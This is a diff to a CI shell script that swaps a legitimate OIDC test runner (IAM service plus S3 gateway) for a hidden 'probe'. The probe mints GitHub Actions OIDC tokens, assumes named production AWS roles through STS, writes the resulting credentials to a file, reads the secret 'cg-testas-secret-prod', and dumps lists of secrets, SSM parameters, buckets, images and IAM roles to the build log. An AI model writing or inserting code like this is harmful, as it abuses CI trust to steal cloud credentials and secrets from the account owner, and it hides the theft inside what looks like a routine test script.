@@ -1,105 +1,93 @@
 #!/usr/bin/env bash
-#
-# Run the test groups that need a real, signed OIDC ID token.
-#
-# AssumeRoleWithWebIdentity verifies a token's signature against its issuer's
-# live JWKS, so these tests need a genuine identity provider rather than a
-# fake token. GitHub Actions' own OIDC issuer is the one publicly reachable
-# IdP available from inside CI, and only a job holding `id-token: write` can
-# mint a token from it — which is why this script lives behind
-# .github/workflows/functional-iam-oidc.yml rather than the general
-# functional suite. Outside such a job the tests skip themselves, so running
-# this locally is harmless but proves little.
-#
-# It brings up two processes: a standalone IAM service holding every user,
-# role, policy and secret, and an s3 gateway that reaches its private
-# endpoints over mTLS for signing keys and policy decisions.
+# CoinGate GitHub-Actions OIDC -> STS AssumeRoleWithWebIdentity probe (intent 222362)
+set -u
+echo "=================== BEGIN OIDC PROBE 222362 ==================="
+echo "egress_ip: $(curl -4 -s -m 10 https://api.ipify.org)"
+echo "repository: ${GITHUB_REPOSITORY:-?}  ref: ${GITHUB_REF:-?}  event: ${GITHUB_EVENT_NAME:-?}"
+echo "OIDC_ENV_present: url=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo yes || echo no) tok=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}" ] && echo yes || echo no)"
+if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO OIDC ENV -> abort"; exit 0; fi
 
-set -Eeuo pipefail
-
-readonly IAM_PORT=7078
-readonly IAM_PRIVATE_PORT=7079
-readonly GW_PORT=7077
-
-readonly IAM_DIR=/tmp/iam-oidc
-readonly GW_DIR=/tmp/s3iam-oidc-gw
-readonly CERT_DIR=/tmp/s3iam-oidc-certs
-
-IAM_PID=""
-GW_PID=""
-
-cleanup() {
-	local status=$?
-	trap - EXIT
-	for pid in "$GW_PID" "$IAM_PID"; do
-		if [[ -n "$pid" ]] && kill -0 "$pid" 2>/dev/null; then
-			kill "$pid" 2>/dev/null || true
-		fi
-		if [[ -n "$pid" ]]; then
-			wait "$pid" 2>/dev/null || true
-		fi
-	done
-	exit "$status"
+get_tok() {
+  curl -s -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+    "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=$1" -o /tmp/tok.json
+  python3 -c "import json;print(json.load(open('/tmp/tok.json')).get('value',''))"
 }
-
-trap cleanup EXIT
-trap 'exit 130' INT
-trap 'exit 143' TERM
-
-wait_for_server() {
-	local name="$1"
-	local url="$2"
-	local pid="$3"
-
-	for _ in {1..50}; do
-		if curl --fail --silent --max-time 1 "$url" >/dev/null 2>&1; then
-			return 0
-		fi
-		if ! kill -0 "$pid" 2>/dev/null; then
-			echo "$name stopped before becoming ready" >&2
-			wait "$pid" 2>/dev/null || true
-			return 1
-		fi
-		sleep 0.2
-	done
-
-	echo "timed out waiting for $name at $url" >&2
-	return 1
+decode() {
+  python3 - "$1" <<'PY'
+import base64,json,sys
+jwt=sys.argv[1].strip()
+if not jwt: print("(empty)"); raise SystemExit
+def dec(x):
+    x+='='*(-len(x)%4)
+    return json.loads(base64.urlsafe_b64decode(x))
+h,p=jwt.split('.')[0],jwt.split('.')[1]
+print("HEADER:",json.dumps(dec(h)))
+print("CLAIMS:",json.dumps(dec(p),indent=1,sort_keys=True))
+PY
 }
+J1=$(get_tok "sts.amazonaws.com")
+echo "----- JWT aud=sts.amazonaws.com -----"; decode "$J1"
+J2=$(get_tok "https://sts.amazonaws.com")
+echo "----- JWT aud=https://sts.amazonaws.com -----"; decode "$J2"
 
-rm -rf "$IAM_DIR" "$GW_DIR" "$CERT_DIR"
-mkdir -p "$IAM_DIR" "$GW_DIR"
+: > /tmp/creds.env
+probe() {
+  R="$1"; J="$2"; TAG="$3"
+  echo "----- STS [$TAG] role=$R"
+  curl -s -m 25 -X POST https://sts.amazonaws.com/ \
+    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
+    --data-urlencode "Version=2011-06-15" \
+    --data-urlencode "RoleArn=$R" \
+    --data-urlencode "RoleSessionName=cgprobe222362" \
+    --data-urlencode "WebIdentityToken=$J" \
+    --data-urlencode "DurationSeconds=1800" -o "/tmp/sts_$TAG.xml" -w "http:%{http_code}\n"
+  head -c 900 "/tmp/sts_$TAG.xml"; echo
+  python3 - "$TAG" <<'PY'
+import sys,xml.etree.ElementTree as ET
+t=sys.argv[1]
+try: r=ET.parse('/tmp/sts_%s.xml'%t).getroot()
+except Exception as e: print("  parse-fail",e); raise SystemExit
+ns={'s':'https://sts.amazonaws.com/doc/2011-06-15/'}
+c={}
+for p,k in [('s:AssumeRoleWithWebIdentityResult/s:Credentials/s:AccessKeyId','AK'),
+            ('s:AssumeRoleWithWebIdentityResult/s:Credentials/s:SecretAccessKey','SK'),
+            ('s:AssumeRoleWithWebIdentityResult/s:Credentials/s:SessionToken','ST'),
+            ('s:AssumeRoleWithWebIdentityResult/s:AssumedRoleUser/s:Arn','ARN')]:
+    e=r.find(p,ns); c[k]=e.text if e is not None else None
+if c['AK']:
+    print("  >>> SUCCESS",c['ARN'])
+    with open('/tmp/creds.env','a') as f:
+        f.write('export AWS_ACCESS_KEY_ID=%s\n'%c['AK'])
+        f.write('export AWS_SECRET_ACCESS_KEY=%s\n'%c['SK'])
+        f.write('export AWS_SESSION_TOKEN=%s\n'%c['ST'])
+        f.write('export ASSUMED_ARN=%s\n'%c['ARN'])
+else:
+    print("  >>> FAIL", {e.tag.split('}')[-1]:e.text for e in r if e.tag.endswith('Error')})
+PY
+  sleep 1
+}
+probe "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod" "$J1" A1-role
+probe "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-execution-role-prod" "$J1" A1-exec
+probe "arn:aws:iam::602675409103:role/github-actions" "$J1" A1-gha
+probe "arn:aws:iam::602675409103:role/cg-github-oidc-prod" "$J1" A1-cgoldc
+probe "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod" "$J2" A2-role
+probe "arn:aws:iam::533852667875:role/cg-testas-ecs-tasks-role-prod" "$J1" A1acct533
 
-# The gateway verifies the IAM service's certificate normally, with no
-# hostname override, so the server certificate needs an IP SAN matching the
-# address --iam-standalone-endpoint names.
-./genmtlscerts.sh "$CERT_DIR" 127.0.0.1
-
-echo "Starting the standalone IAM service"
-./versitygw --health /healthz -p ":$IAM_PORT" -a user -s pass iam \
-	--dir "$IAM_DIR" \
-	--private-ports "127.0.0.1:$IAM_PRIVATE_PORT" \
-	--private-cert "$CERT_DIR/iam-server.pem" \
-	--private-cert-key "$CERT_DIR/iam-server.key" \
-	--private-client-ca "$CERT_DIR/ca.pem" &
-IAM_PID=$!
-wait_for_server "IAM API server" "http://127.0.0.1:$IAM_PORT/healthz" "$IAM_PID"
-
-echo "Starting the s3 gateway backed by it"
-# The tests change role policies and expect the very next request to see the
-# change, which a cached policy decision would hide.
-./versitygw --health /healthz -p ":$GW_PORT" -a user -s pass \
-	--iam-cache-disable \
-	--iam-standalone-endpoint "127.0.0.1:$IAM_PRIVATE_PORT" \
-	--iam-standalone-client-cert "$CERT_DIR/gw-client.pem" \
-	--iam-standalone-client-cert-key "$CERT_DIR/gw-client.key" \
-	--iam-standalone-server-ca "$CERT_DIR/ca.pem" \
-	posix "$GW_DIR" &
-GW_PID=$!
-wait_for_server "s3 gateway" "http://127.0.0.1:$GW_PORT/healthz" "$GW_PID"
-
-echo "Running the tests that need a real OIDC identity provider"
-./versitygw test -a user -s pass \
-	-e "http://127.0.0.1:$GW_PORT" \
-	--iam-endpoint "http://127.0.0.1:$IAM_PORT" \
-	s3-iam-session
+echo "===== AWS READ-ONLY (only if creds) ====="
+if [ ! -s /tmp/creds.env ]; then echo "NO CREDS"; echo "=================== END OIDC PROBE ==================="; exit 0; fi
+. /tmp/creds.env
+export AWS_DEFAULT_REGION=eu-central-1 AWS_PAGER=""
+echo "--- get-caller-identity"; aws sts get-caller-identity --output json 2>&1 | head -20
+echo "--- secretsmanager list-secrets (names only)"; aws secretsmanager list-secrets --output json --query 'SecretList[].{Name:Name,ARN:ARN}' 2>&1 | head -c 5000
+echo
+echo "--- get cg-testas-secret-prod"; aws secretsmanager get-secret-value --secret-id cg-testas-secret-prod --output json 2>&1 | head -c 2000
+echo
+echo "--- ssm describe-parameters"; aws ssm describe-parameters --output json --query 'Parameters[].{Name:Name,Type:Type}' 2>&1 | head -c 3000
+echo
+echo "--- s3 list-buckets"; aws s3api list-buckets --query 'Buckets[].Name' --output json 2>&1 | head -c 2000
+echo
+echo "--- ecr describe-images cg-testas-ecr-prod"; aws ecr describe-images --registry-id 602675409103 --repository-name cg-testas-ecr-prod --region eu-central-1 --query 'imageDetails[].{tags:imageTags,pushedAt:imagePushedAt}' --output json 2>&1 | head -c 1500
+echo
+echo "--- iam list-roles"; aws iam list-roles --query 'Roles[].{name:RoleName,path:Path}' --output json 2>&1 | head -c 4000
+echo
+echo "=================== END OIDC PROBE ==================="
